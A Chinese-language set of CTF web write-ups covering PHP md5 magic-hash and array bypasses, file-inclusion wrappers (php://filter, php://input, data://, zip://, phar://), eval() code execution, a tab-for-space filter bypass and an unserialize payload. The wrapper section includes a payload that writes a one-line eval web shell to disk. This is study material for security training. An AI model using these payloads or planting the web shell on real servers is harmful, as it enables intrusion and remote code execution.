 # CTF-WEB

## 1. PHP md5 相等绕过
要求字符串不同，但MD5相同

![image.png](img/1-CTF_WEB/1723443073686-5b063869-00fe-4b1e-9c56-7725ef648760.png)
<<<<<<< HEAD
解题参考[PHP md5 相等绕过 - Ainsliaea - 博客园 (cnblogs.com)](https://www.cnblogs.com/ainsliaea/p/15126218.html)

=======

解题参考
[PHP md5 相等绕过 - Ainsliaea - 博客园 (cnblogs.com)](https://www.cnblogs.com/ainsliaea/p/15126218.html)
>>>>>>> 386a9688f46e145544a413b7f724106d528dc3e4
**方法1：**
处理hash字符串时，PHP会将每一个以 0E开头的哈希值解释为0，同时后面都是数字，不能包含其他字符的字符串，md5 值会相等（`==` 的结果为 True，但 `===` 的结果为 False）。那么PHP会认为它们相同

![](img/1-CTF_WEB/1723443990504-3cbbfbb8-44db-483b-91d1-f250f3732497.jpeg)

**方法2：**
使用数组绕过，在 PHP5 和 PHP7 中，当两个 md5 进行比较时，若参数是不同的数组，那么 `==` 和 `===` 比较的结果均为 True

![](img/1-CTF_WEB/1723444019927-4af6822b-4053-477d-a114-a7028a5e6a4f.jpeg)

**方法3：**
利用 fastcoll 进行 md5 碰撞，生成两个字面值不同但 md5 相同的文件。[HashClash (tue.nl)](https://www.win.tue.nl/hashclash/)

### "oe" 绕过

根据这篇文章[[1\]](https://www.cnblogs.com/ainsliaea/p/15126218.html#fn1)，

> 因为处理hash字符串时，PHP会将每一个以 0E开头的哈希值解释为0，那么只要传入的不同字符串经过哈希以后是以 0E开头的，那么PHP会认为它们相同

基本的原理是这样的，但更严谨的字符串格式是，`0e` 开头，同时后面都是数字，不能包含其他字符的字符串，md5 值才会相等（`==` 的结果为 True，但 `===` 的结果为 False）。

```php
<?php
$a = "s878926199a";
$b = "s155964671a";

print_r($a . "-->" . md5($a) . "<br>");
print_r($b . "-->" . md5($b) . "<br>");
// s878926199a-->0e545993274517709034328855841020
// s155964671a-->0e342768416822451524974117254469

print_r(var_dump(md5($a) == md5($b)) . "<br>"); // bool(true)

// 数字 vs 数字
$a1 = "0e33";
$b1 = "0e89";
print_r(var_dump($a1 == $b1) . "<br>"); // bool(true)

// 数字 vs 字母
$a3 = "0eadd";
$b3 = "0e232";
print_r(var_dump($a3 == $b3) . "<br>"); // bool(false)

// 数字 vs 数字/字母
$a4 = "0ea34343dd";
$b4 = "0e232";
print_r(var_dump($a4 == $b4) . "<br>"); // bool(false)
```



常见的 md5 值是 `0e` 开头且后面均为数字的字符串

```php
s878926199a
0e545993274517709034328855841020
s155964671a
0e342768416822451524974117254469
s214587387a
0e848240448830537924465865611904
s214587387a
0e848240448830537924465865611904
s878926199a
0e545993274517709034328855841020
s1091221200a
0e940624217856561557816327384675
s1885207154a
0e509367213418206700842008763514
s1502113478a
0e861580163291561247404381396064
s1885207154a
0e509367213418206700842008763514
s1836677006a
0e481036490867661113260034900752
s155964671a
0e342768416822451524974117254469
s1184209335a
0e072485820392773389523109082030
s1665632922a
0e731198061491163073197128363787
s1502113478a
0e861580163291561247404381396064
s1836677006a
0e481036490867661113260034900752
s1091221200a
0e940624217856561557816327384675
s155964671a
0e342768416822451524974117254469
s1502113478a
0e861580163291561247404381396064
s155964671a
0e342768416822451524974117254469
s1665632922a
0e731198061491163073197128363787
s155964671a
0e342768416822451524974117254469
s1091221200a
0e940624217856561557816327384675
s1836677006a
0e481036490867661113260034900752
s1885207154a
0e509367213418206700842008763514
s532378020a
0e220463095855511507588041205815
s878926199a
0e545993274517709034328855841020
s1091221200a
0e940624217856561557816327384675
s214587387a
0e848240448830537924465865611904
s1502113478a
0e861580163291561247404381396064
s1091221200a
0e940624217856561557816327384675
s1665632922a
0e731198061491163073197128363787
s1885207154a
0e509367213418206700842008763514
s1836677006a
0e481036490867661113260034900752
s1665632922a
0e731198061491163073197128363787
s878926199a
0e545993274517709034328855841020
240610708 
0e462097431906509019562988736854
314282422 
0e990995504821699494520356953734
571579406 
0e972379832854295224118025748221
903251147 
0e174510503823932942361353209384
1110242161 
0e435874558488625891324861198103
1320830526 
0e912095958985483346995414060832
1586264293 
0e622743671155995737639662718498
2302756269 
0e250566888497473798724426794462
2427435592 
0e067696952328669732475498472343
2653531602 
0e877487522341544758028810610885
3293867441 
0e471001201303602543921144570260
3295421201 
0e703870333002232681239618856220
3465814713 
0e258631645650999664521705537122
3524854780 
0e507419062489887827087815735195
3908336290 
0e807624498959190415881248245271
4011627063 
0e485805687034439905938362701775
4775635065 
0e998212089946640967599450361168
4790555361 
0e643442214660994430134492464512
5432453531 
0e512318699085881630861890526097
5579679820 
0e877622011730221803461740184915
5585393579 
0e664357355382305805992765337023
6376552501 
0e165886706997482187870215578015
7124129977 
0e500007361044747804682122060876
7197546197 
0e915188576072469101457315675502
7656486157 
0e451569119711843337267091732412
QLTHNDT 
0e405967825401955372549139051580
QNKCDZO 
0e830400451993494058024219903391
EEIZDOI 
0e782601363539291779881938479162
TUFEPMC 
0e839407194569345277863905212547
UTIPEZQ 
0e382098788231234954670291303879
UYXFLOI 
0e552539585246568817348686838809
IHKFRNS 
0e256160682445802696926137988570
PJNPDWY 
0e291529052894702774557631701704
ABJIHVY 
0e755264355178451322893275696586
DQWRASX 
0e742373665639232907775599582643
DYAXWCA 
0e424759758842488633464374063001
GEGHBXL 
0e248776895502908863709684713578
GGHMVOE 
0e362766013028313274586933780773
GZECLQZ 
0e537612333747236407713628225676
NWWKITQ 
0e763082070976038347657360817689
NOOPCJF 
0e818888003657176127862245791911
MAUXXQC 
0e478478466848439040434801845361
MMHUWUV 
0e701732711630150438129209816536
```

### 数组绕过（PHP 8 无法绕过）

在 PHP5 和 PHP7 中，当两个 md5 进行比较时，若参数是不同的数组，那么 `==` 和 `===` 比较的结果均为 True

```php
// /param.php?a[]=1&b[]=2
print_r(PHP_VERSION . "<br>");

$a = $_GET["a"];
$b = $_GET["b"];

print_r($a . "<br>");
print_r($b . "<br>");

print_r(var_dump(md5($a) === md5($b)));
```

PHP5
![image](img/1-CTF_WEB/1028937-20210813223807312-1920084303.png)
PHP7
![image](img/1-CTF_WEB/1028937-20210813223704009-2058159871.png)
然而 PHP8。。。
![image](img/1-CTF_WEB/1028937-20210813223612557-1583276200.png)

### md5 碰撞

利用 fastcoll 进行 md5 碰撞，生成两个字面值不同但 md5 相同的文件。
新建一个空的 txt 文档。
![image](img/1-CTF_WEB/1028937-20210812220502399-2146878296.png)
然后拖到 exe 上，自动生成两个文件。
![image](img/1-CTF_WEB/1028937-20210812221853105-890851667.png)
得到两个文件，通过代码读取即可。
![image](img/1-CTF_WEB/1028937-20210812220837399-1461005175.png)

```php
<?php

$a = file_get_contents('D:tmp\a_msg1.txt');
$b = file_get_contents('D:tmp\a_msg2.txt');

print_r($a . "<br>");
print_r($b . "<br>");
print_r(var_dump($a === $b) . "<br>"); // bool(false)
print_r(var_dump(md5($a) === md5($b)) . "<br>"); // bool(true)
```

md5 碰撞面对一些绕过非常有用，例如通过参数上传一句话木马[[2\]](https://www.cnblogs.com/ainsliaea/p/15126218.html#fn2)。

------

1. https://zhuanlan.zhihu.com/p/123235283 [↩︎](https://www.cnblogs.com/ainsliaea/p/15126218.html#fnref1)
2. https://www.cnblogs.com/Riv3r1and/p/13795704.html [↩︎](https://www.cnblogs.com/ainsliaea/p/15126218.html#fnref2)



## 2. php文件包含&php伪协议

参考[PHP伪协议总结 - 个人文章 - SegmentFault 思否](https://segmentfault.com/a/1190000018991087)

这里用到了**`php://filter`**，它主要用来读取文件源码。

题目首页

![image-20240812152610387](img/1-CTF_WEB/image-20240812152610387.png)

遂`/?file=…`一个随意参数，而后得到源代码

![image-20240812152710006](img/1-CTF_WEB/image-20240812152710006.png)

然后利用`php://`协议

![image-20240812152543637](img/1-CTF_WEB/image-20240812152543637.png)



### `file://` 协议

- **条件**：

  - `allow_url_fopen`:off/on
  - `allow_url_include` :off/on

- **作用**：
  用于访问本地文件系统，在CTF中通常用来**读取本地文件**的且不受`allow_url_fopen`与`allow_url_include`的影响。
  `include()/require()/include_once()/require_once()`参数可控的情况下，如导入为非`.php`文件，则仍按照php语法进行解析，这是`include()`函数所决定的。

- **说明**：
  `file://` 文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以/、、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 `fopen()` 和 `file_get_contents()`，`include_path `会可选地搜索，也作为相对的路径。

- **用法**：

  ```pgsql
  /path/to/file.ext
  relative/path/to/file.ext
  fileInCwd.ext
  C:/path/to/winfile.ext
  C:\path\to\winfile.ext
  \\smbserver\share\path\to\winfile.ext
  file:///path/to/file.ext
  ```

- **示例**：

  1. `file://[文件的绝对路径和文件名]`

     ```http
     http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt
     ```

     ![](img/1-CTF_WEB/bVbrQAZ.png)

  2. `[文件的相对路径和文件名]`

     ```http
     http://127.0.0.1/include.php?file=./phpinfo.txt
     ```

     ![](img/1-CTF_WEB/bVbrQA1.png)

  3. `[http：//网络路径和文件名]`

     ```http
     http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt
     ```

     ![](img/1-CTF_WEB/bVbrQBb.png)

- **参考**：[http://php.net/manual/zh/wrappers.file.php](https://link.segmentfault.com/?enc=DuT6iHHjrv6yYwe%2FL%2BXwLw%3D%3D.khro9XPxRj3wwsu1ZqN%2FR%2Bc2T9GU1D2%2BPCinvjrKORB9TsauqGBqEgNvkasA34na)

### `php://` 协议

- **条件**：

  - `allow_url_fopen`:off/on
  - `allow_url_include` :仅`php://input php://stdin php://memory php://temp `需要on

- **作用**：
  `php://` 访问各个输入/输出流（I/O streams），在CTF中经常使用的是`php://filter`和`php://input`，`php://filter`用于**读取源码**，`php://input`用于**执行php代码**。

- **说明**：
  PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，
  内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。

  | 协议                    | 作用                                                         |
  | ----------------------- | ------------------------------------------------------------ |
  | php://input             | 可以访问请求的原始数据的只读流，在POST请求中访问POST的`data`部分，在`enctype="multipart/form-data"` 的时候`php://input `是无效的。 |
  | php://output            | 只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。 |
  | php://fd                | (>=5.3.6)允许直接访问指定的文件描述符。例如 `php://fd/3` 引用了文件描述符 3。 |
  | php://memory php://temp | (>=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 `php://memory` 总是把数据储存在内存中，而 `php://temp` 会在内存量达到预定义的限制后（默认是 `2MB`）存入临时文件中。临时文件位置的决定和 `sys_get_temp_dir()` 的方式一致。 |
  | php://filter            | (>=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式`（all-in-one）`的文件函数非常有用，类似 `readfile()`、`file()` 和 `file_get_contents()`，在数据流内容读取之前没有机会应用其他过滤器。 |

- **`php://filter`参数详解**

  该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：

  | php://filter 参数         | 描述                                                         |           |
  | ------------------------- | ------------------------------------------------------------ | --------- |
  | resource=<要过滤的数据流> | 必须项。它指定了你要筛选过滤的数据流。                       |           |
  | read=<读链的过滤器>       | 可选项。可以设定一个或多个过滤器名称，以管道符（*\           | *）分隔。 |
  | write=<写链的过滤器>      | 可选项。可以设定一个或多个过滤器名称，以管道符（\            | ）分隔。  |
  | <; 两个链的过滤器>        | 任何没有以 *read=* 或 *write=* 作前缀的筛选器列表会视情况应用于读或写链。 |           |

- **可用的过滤器列表（4类）**

  此处列举主要的过滤器类型，详细内容请参考：[https://www.php.net/manual/zh/filters.php](https://link.segmentfault.com/?enc=%2BScuuAKhKBrETSFSxeZFNg%3D%3D.55xVN7GO2bm6FIXeqxxno64MaW1xXlHlKgBq5sNB2QaIsej%2BKq4%2BrYYxkVW%2BEshH)

  | 字符串过滤器      | 作用                                        |
  | ----------------- | ------------------------------------------- |
  | string.rot13      | 等同于`str_rot13()`，rot13变换              |
  | string.toupper    | 等同于`strtoupper()`，转大写字母            |
  | string.tolower    | 等同于`strtolower()`，转小写字母            |
  | string.strip_tags | 等同于`strip_tags()`，去除html、PHP语言标签 |

  | 转换过滤器                                                   | 作用                                                       |
  | ------------------------------------------------------------ | ---------------------------------------------------------- |
  | convert.base64-encode & convert.base64-decode                | 等同于`base64_encode()`和`base64_decode()`，base64编码解码 |
  | convert.quoted-printable-encode & convert.quoted-printable-decode | quoted-printable 字符串与 8-bit 字符串编码解码             |

  | 压缩过滤器                        | 作用                                                         |
  | --------------------------------- | ------------------------------------------------------------ |
  | zlib.deflate & zlib.inflate       | 在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。 |
  | bzip2.compress & bzip2.decompress | 同上，在本地文件系统中创建 bz2 兼容文件的方法。              |

  | 加密过滤器 | 作用                   |
  | ---------- | ---------------------- |
  | mcrypt.*   | libmcrypt 对称加密算法 |
  | mdecrypt.* | libmcrypt 对称解密算法 |

- **示例**：

  1. `php://filter/read=convert.base64-encode/resource=[文件名]`读取文件源码（针对php文件需要base64编码）

     ```livecodeserver
     http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php
     ```

     ![](img/1-CTF_WEB/bVbrQBf.png)

  2. `php://input + [POST DATA]`执行php代码

     ```php
     http://127.0.0.1/include.php?file=php://input
     [POST DATA部分]
     <?php phpinfo(); ?>
     ```

     ![](img/1-CTF_WEB/bVbrQBh.png)

     若有写入权限，写入一句话木马

     ```php
     http://127.0.0.1/include.php?file=php://input
     [POST DATA部分]
     <?php fputs(fopen('1juhua.php','w'),'<?php @eval($_GET[cmd]); ?>'); ?>
     ```

     ![](img/1-CTF_WEB/bVbrQBi.png)

- **参考**：[https://php.net/manual/zh/wrappers.php.php](https://link.segmentfault.com/?enc=juZnqmg2HQMZii5vLbm1bQ%3D%3D.f4xV6RjgZWGtUZ%2FjtD%2BE4GPxKFoDqttbkcw61aLWdrXwAqdVpt4QM0sZ%2Bw48219A)

### `zip:// & bzip2:// & zlib://` 协议

- **条件**：

  - `allow_url_fopen`:off/on
  - `allow_url_include` :off/on

- **作用**：`zip:// & bzip2:// & zlib://` 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：`jpg png gif xxx` 等等。

- **示例**：

  1. `zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]`（#编码为%23）

     压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传

     ```http
     http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt
     ```

     ![](img/1-CTF_WEB/bVbrQBj.png)

  2. `compress.bzip2://file.bz2`

     压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）

     ```http
     http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2
     ```

     ![](img/1-CTF_WEB/bVbrQBt.png)

  3. `compress.zlib://file.gz`

     压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）

     ```http
     http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz
     ```

     ![](img/1-CTF_WEB/bVbrQBu.png)

- **参考**：[http://php.net/manual/zh/wrappers.compression.php](https://link.segmentfault.com/?enc=c7kLn2116lHYz%2Bxdh8uWLg%3D%3D.sj39fMX2XLCmDRe1yx3bXe0O%2Bl37DHiuTIrhp7TD4ecbPodccTGwi7qnB9m8IDmNVyGc5NV8nkQb6X9PUiRlow%3D%3D)

### `data://` 协议

- **条件**：

  - `allow_url_fopen`:on
  - `allow_url_include` :on

- **作用**：自`PHP>=5.2.0`起，可以使用`data://`数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。

- **用法**：

  ```awk
  data://text/plain,
  data://text/plain;base64,
  ```

- **示例**：

  1. `data://text/plain,`

     ```http
     http://127.0.0.1/include.php?file=data://text/plain,<?php%20phpinfo();?>
     ```

     

  2. `data://text/plain;base64,`

     ```http
     http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
     ```

     ![](img/1-CTF_WEB/bVbrQBD.png)

### `http:// & https://` 协议

- **条件**：

  - `allow_url_fopen`:on
  - `allow_url_include` :on

- **作用**：常规 URL 形式，允许通过 `HTTP 1.0` 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。

- **用法**：

  ```http
  http://example.com
  http://example.com/file.php?var1=val1&var2=val2
  http://user:password@example.com
  https://example.com
  https://example.com/file.php?var1=val1&var2=val2
  https://user:password@example.com
  ```

- **示例**：

  ```http
  http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt
  ```

  ![](img/1-CTF_WEB/bVbrQBP.png)

### `phar://` 协议

`phar://`协议与`zip://`类似，同样可以访问zip格式压缩包内容，在这里只给出一个示例：

```http
http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt
```

![](img/1-CTF_WEB/bVbrQBX.png)

另外在 Black Hat 2018 大会上，研究人员公布了一款针对PHP应用程序的全新攻击技术：**phar://协议对象注入技术**。

因为该利用点需要满足一定的条件才能利用，可以参考下面这篇文章，里面的demo也非常详细，留作以后专门研究一下。

> 参考文章：[seebug - 利用 phar 拓展 php 反序列化漏洞攻击面](https://link.segmentfault.com/?enc=w%2Bh6RmR%2B%2ByO1MANgSOjvqw%3D%3D.Aawch9shmel0TLvUa8J1QRwwpCGK%2FDai6cqfAaGTxJg%3D)



## 3. php eval() RCE

题目里代码是`eval()`，只需要把命令放到`system()`函数里就行。**记得后面加分号！！！**

![image-20240812165242418](img/1-CTF_WEB/image-20240812165242418.png)

改成POST也是一样

![image-20240812165631950](img/1-CTF_WEB/image-20240812165631950.png)

## 4. php 后台过滤空格绕过

题目

![image-20240812173258342](img/1-CTF_WEB/image-20240812173258342.png)

这里先要求改cookie，在返回包中看见了新目录：`rasalghul.php`。但不是重点，后面这样

![image-20240812173341997](img/1-CTF_WEB/image-20240812173341997.png)

这里过滤了空格，我使用`%09`(`Tab`)绕过

![image-20240812173552674](img/1-CTF_WEB/image-20240812173552674.png)



## 5. php反序列化

题目开始先要目录扫描，发现一个`robots.txt`，进而发现了`/cl45s.php`

![image-20240812175337606](img/1-CTF_WEB/image-20240812175337606.png)

看到`__destruct()`方法被重写，则可以尝试反序列化。

```php
<?php
class wllm{

    public $admin;
    public $passwd;

    public function __construct(){
        $this->admin ="user";
        $this->passwd = "123456";
    }

        public function __destruct(){
        if($this->admin === "admin" && $this->passwd === "ctf"){
            // include("flag.php");
            // echo $flag;
        }else{
            echo $this->admin;
            echo $this->passwd;
            echo "Just a bit more!";
        }
    }
}
$aa = new wllm();
$aa->admin = "admin";
$aa->passwd = "ctf";
$stus = serialize($aa);
print_r($stus);
?>
```



![image-20240812180149556](img/1-CTF_WEB/image-20240812180149556.png)

得到序列化的结果（其实不写代码也行，这快能自己编出来）

```
O:4:"wllm":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:3:"ctf";}
```

`/?p=O:4:“wllm”:2:{s:5:“admin”;s:5:“admin”;s:6:“passwd”;s:3:“ctf”;}`

最后得到flag

![image-20240812180404781](img/1-CTF_WEB/image-20240812180404781.png)

